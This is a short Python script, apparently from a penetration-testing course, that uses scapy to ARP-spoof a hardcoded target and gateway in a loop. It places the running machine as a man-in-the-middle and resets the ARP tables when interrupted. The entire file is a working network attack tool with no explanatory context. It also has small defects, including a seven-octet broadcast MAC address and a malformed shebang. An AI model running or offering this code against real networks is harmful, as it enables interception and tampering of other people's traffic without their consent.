#!usr/bin/env python

import time
import sys
import scapy.all as scapy

def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 1 , verbose = False)[0]

    return answered_list[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose = False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2 ,pdst = destination_ip, hwdst = destination_mac , psrc= source_ip , hwsrc = source_mac)
    scapy.send(packet, verbose = False, count = 4)
    # print(packet.show())
    # print(packet.summary())

# print(packet.show())
# print(packet.summary())

target_ip = "10.0.2.8"
gateway_ip = "10.0.2.1"
try:
    sent_packet_count = 0
    while True:
        spoof(target_ip,gateway_ip)
        spoof(gateway_ip,target_ip)
        sent_packet_count +=2
        print("\r[+] packet sent : " + str(sent_packet_count), end="")
        # print("\r[+] packet sent : " + str(sent_packet_count )),
        # sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected Cltr + c.......Resetting ARP tables .... Please wait. \n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)


